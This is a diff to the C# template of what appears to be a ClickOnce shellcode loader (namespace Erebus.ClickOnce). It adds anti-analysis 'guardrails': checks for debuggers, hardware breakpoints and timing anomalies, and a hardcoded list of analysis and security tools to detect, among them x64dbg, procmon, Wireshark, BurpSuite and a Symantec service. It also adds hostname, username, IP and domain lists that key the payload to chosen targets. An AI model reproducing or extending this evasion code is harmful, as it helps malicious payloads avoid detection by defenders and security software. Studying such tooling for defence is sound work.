@@ -84,5 +84,73 @@ namespace Erebus.ClickOnce
         /// Shellcode Byte Array
         /// </summary>
         public static byte[] Shellcode = new byte[] { {{ ENCRYPTION_SHELLCODE }} };
+
+        // ============================================
+        // GUARDRAILS CONFIGURATION
+        // ============================================
+
+        /// <summary>
+        /// Enable/disable guardrails checks
+        /// </summary>
+        public static bool GuardrailsEnabled = {{ GUARDRAILS_ENABLED }};
+
+        /// <summary>
+        /// Check if process is being debugged
+        /// </summary>
+        public static bool CheckDebugger = {{ GUARDRAILS_CHECK_DEBUGGER }};
+
+        /// <summary>
+        /// Check for debugger processes
+        /// </summary>
+        public static bool CheckDebuggerProcesses = {{ GUARDRAILS_CHECK_DEBUGGER_PROCESSES }};
+
+        /// <summary>
+        /// Check for hardware breakpoints
+        /// </summary>
+        public static bool CheckHardwareBreakpoints = {{ GUARDRAILS_CHECK_HARDWARE_BREAKPOINTS }};
+
+        /// <summary>
+        /// Check for timing anomalies
+        /// </summary>
+        public static bool CheckTiming = {{ GUARDRAILS_CHECK_TIMING }};
+
+        /// <summary>
+        /// List of blocked debugger/analysis processes
+        /// </summary>
+        public static string[] BlockedProcesses = new string[] { 
+            "x64dbg", "x32dbg", "windbg", "ollydbg", "Debugger",
+            "ProcessEXPLORER", "procmon", "autoruns", "Wireshark",
+            "fiddler", "Charles", "BurpSuite", "ccSvcHst"
+        };
+
+        /// <summary>
+        /// Whitelisted hostnames (empty = allow all)
+        /// </summary>
+        public static string[] AllowedHostnames = new string[] { {{ ALLOWED_HOSTNAMES }} };
+
+        /// <summary>
+        /// Blacklisted hostnames (empty = block none)
+        /// </summary>
+        public static string[] BlockedHostnames = new string[] { {{ BLOCKED_HOSTNAMES }} };
+
+        /// <summary>
+        /// Blacklisted usernames (empty = block none)
+        /// </summary>
+        public static string[] BlockedUsernames = new string[] { {{ BLOCKED_USERNAMES }} };
+
+        /// <summary>
+        /// Whitelisted IP address prefixes (empty = allow all)
+        /// </summary>
+        public static string[] AllowedIPs = new string[] { {{ ALLOWED_IPS }} };
+
+        /// <summary>
+        /// Blacklisted IP address prefixes (empty = block none)
+        /// </summary>
+        public static string[] BlockedIPs = new string[] { {{ BLOCKED_IPS }} };
+
+        /// <summary>
+        /// Whitelisted domains (empty = allow all)
+        /// </summary>
+        public static string[] AllowedDomains = new string[] { {{ ALLOWED_DOMAINS }} };
     }
 }
